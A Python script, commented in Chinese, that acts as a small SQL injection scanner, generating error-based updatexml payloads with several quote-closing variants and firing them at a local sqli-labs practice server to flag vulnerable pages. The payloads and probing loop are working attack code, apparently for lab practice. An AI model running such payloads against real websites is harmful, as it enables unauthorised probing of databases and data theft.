# 检测漏洞模块
import requests
import hashlib
import random
import string
import requests
import asyncio
import urllib
import aiohttp


class Vul:
    def __init__(self):
        self.headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;",
            "Accept-Encoding": "gzip",
            "Accept-Language": "zh-CN,zh;q=0.8",
            "Referer": "https://www.baidu.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
        }
        self.randomstr = ''.join(
            random.choices(
                string.ascii_letters +
                string.digits,
                k=15))
        self.vuls = []
    # 生成SQL注入检测Payload

    def get_sqli_payloads(self):
        payloads = []
        seal_character = ['', '\'', '"', '\')', '")']
        for ch in seal_character:
            payload = f'{ch} and updatexml(1,concat(0x7e,(SELECT {self.randomstr}),0x7e),1)--+'
            payloads.append(payload)
        return payloads

    # 根据Text分析sql注入是否存在
    def analyse_sqli(self, text):
        if text:
            if self.randomstr in text:
                return True
        return False

    # 负责SQL注入检测逻辑引擎
    async def sqli(self, url):
        async with aiohttp.ClientSession() as session:
            for payload in self.get_sqli_payloads():
                target = url + payload
                text = await self.fetch(session, target)
                if self.analyse_sqli(text):
                    self.vuls.append((url, payload))
                    break

    async def fetch(self, session, url):
        try:
            async with session.get(url, headers=self.headers, timeout=3, verify_ssl=False) as response:
                try:
                    response = await session.get(url)
                except BaseException as e:
                    pass
                text = await response.text()
                return text
        except Exception as e:
            pass

    async def run(self):
        await asyncio.gather(*[self.sqli(f'http://192.168.1.205/sqli-labs/Less-{str(i)}/index.php?id=1') for i in range(1, 50)])
        for i in self.vuls:
            print(i)


a = Vul()
asyncio.run(a.run())
